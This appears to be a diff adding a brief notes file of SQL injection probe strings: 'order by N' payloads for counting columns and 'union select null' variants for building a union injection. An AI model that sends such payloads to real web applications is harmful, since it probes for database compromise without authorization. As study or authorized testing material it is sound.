@@ -1,0 +1,15 @@
+method:
+
+'order by 1 --
+
+'order by 10 --
+
+'order by 5 --
+
+'order by 2 --
+
+
+or 
+
+union select null--
+union select null,null--
